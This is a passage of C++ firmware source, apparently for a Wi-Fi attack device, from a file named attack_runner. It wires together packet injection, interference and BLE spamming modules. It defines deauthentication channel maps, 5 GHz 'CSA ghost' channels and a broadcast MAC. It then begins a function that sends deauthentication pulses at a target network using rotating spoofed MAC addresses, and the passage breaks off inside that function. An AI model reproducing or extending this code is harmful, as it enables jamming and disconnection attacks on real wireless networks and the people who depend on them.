#include "attack_runner.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "wifi_conf.h"
#include "../../debug.h"
#include "../config/app_config.h"
#include "../core/led_controller.h"
#include "../ble/ble_manager.h"
#include "../interference/interference.h"
#include "../oled/oled_display.h"
#include "../packet-injection/packet-injection.h"
#include "../security/security_utils.h"
#include "../spammer/spammer.h"
#include "../wifi/wifi_scanner.h"

std::map<int, std::vector<int>> g_deauth_channels;

static const uint8_t kCsaGhostChannels[] = {36, 40, 44, 48, 149, 153, 157, 161};
static uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void attackPrepareStaRadio() {
    wifi_off();
    delay(100);
    wifi_on(RTW_MODE_STA);
    delay(150);
    wifi_disable_powersave();
}

static uint32_t _sendDeauthPulseForTarget(uint8_t* bssid, const char* ssid, bool is_5g,
                                          uint16_t reason, uint32_t& mac_seq, size_t& csa_idx) {
    mac_seq++;
    uint8_t rand_mac[6] = {
        0x02,
        (uint8_t)(mac_seq >> 24),
        (uint8_t)(mac_seq >> 16),
        (uint8_t)(mac_seq >> 8),
        (uint8_t)mac_seq,
        0xAA
    };
